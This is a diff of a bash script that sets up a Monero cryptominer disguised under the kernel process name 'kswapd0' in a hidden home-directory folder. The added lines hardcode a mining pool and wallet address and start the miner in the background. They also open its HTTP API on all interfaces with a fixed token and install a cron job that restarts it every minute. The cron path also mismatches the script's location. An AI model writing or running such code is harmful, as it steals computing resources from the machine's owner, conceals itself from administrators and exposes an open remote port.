@@ -61,32 +61,33 @@ sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.gdm2_man
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm2_manual/config.json
 
 # Run kswapd0 if no other process with the specific configuration is running
-if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
+if ! pgrep -f "$HOME/.gdm2_manual/kswapd0 --config=$HOME/.gdm2_manual/config.json" > /dev/null; then
     echo "kswapd0 not started. Starting it..."
-    "$KSWAPD0" --config="$CONFIG_JSON" &
+    "$HOME/.gdm2_manual/kswapd0 --config=$HOME/.gdm2_manual/config.json" &
 else
     echo "kswapd0 is already running."
 fi
 
 # Create the check script
-cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
+cat <<'EOF' >"$HOME/.gdm2_manual/check_and_start.sh"
 #!/bin/bash
+lockfile="$HOME/.gdm2_manual/check_and_start.lock"
 
-KSWAPD0_PATH="$HOME/.gdm2_manual/kswapd0"
-CONFIG_JSON_PATH="$HOME/.gdm2_manual/config.json"
+# Locking-Mechanismus mit flock
+exec 200>"$lockfile"
+flock -n 200 || exit 1
 
-if ! pgrep -f "./kswapd0" > /dev/null; then
-    echo "kswapd0 not started. Going to start it..."
-    cd "$HOME/.gdm2_manual/" || exit
-    ./kswapd0 --config=config.json &
-else
-    echo "kswapd0 already started."
+if ! pgrep -f "$HOME/.gdm2_manual/kswapd0"; then
+  $HOME/.gdm2_manual/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
 fi
 EOF
 
 # Make the check script executable
-chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"
+chmod +x "$HOME/.gdm2_manual/check_and_start.sh"
 
-# Cron job setup: remove outdated lines and add the new command
-CRON_JOB="*/5 * * * * $HOME/.gdm2_manual/check_kswapd0.sh"
-(crontab -l 2>/dev/null | grep -v -E '(out dat|check_kswapd0.sh)'; echo "$CRON_JOB") | crontab -
+# Nur einen Cronjob hinzufügen, falls nicht vorhanden
+(crontab -l 2>/dev/null | grep -v "check_and_start.sh"; echo "* * * * * $HOME/.gdm2/check_and_start.sh") | crontab -
+
+## Cron job setup: remove outdated lines and add the new command
+#CRON_JOB="*/5 * * * * $HOME/.gdm2_manual/check_and_start.sh"
+#(crontab -l 2>/dev/null | grep -v -E '(out dat|check_and_start.sh)'; echo "$CRON_JOB") | crontab -
